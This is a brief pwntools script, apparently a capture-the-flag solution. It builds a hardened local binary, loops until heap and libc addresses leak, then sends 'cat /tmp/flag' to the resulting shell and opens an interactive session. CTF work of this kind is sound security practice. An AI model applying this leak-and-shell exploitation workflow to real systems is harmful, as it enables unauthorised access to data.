from pwn import*
context.log_level = 'DEBUG'
os.system("gcc 1.c -o main -z noexecstack -fstack-protector-all -pie -z now")
while True:
	l = process("./echo_srv")
	p = process('./main')
	try:
		p.recvuntil("HEAP:\t",timeout=1)
		p.recvuntil("LIBC:\t",timeout=1)
		break
	except:
		l.close()
		p.close()
		continue
os.system("rm core")
p.sendline('cat /tmp/flag')
p.interactive()
